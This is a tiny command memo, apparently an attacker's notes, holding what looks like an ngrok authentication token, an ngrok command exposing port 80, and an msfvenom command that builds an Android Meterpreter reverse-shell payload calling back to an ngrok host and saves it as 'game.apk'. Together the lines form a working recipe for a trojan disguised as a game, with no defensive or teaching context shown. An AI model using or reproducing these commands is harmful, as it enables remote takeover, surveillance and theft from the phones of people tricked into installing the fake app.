1zkCXFsmmjxY4hyNu49XHUQSnyb_67HpcjV4dof7SqXg1iuV3
./ngrok http 80

msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=15530 R > game.apk
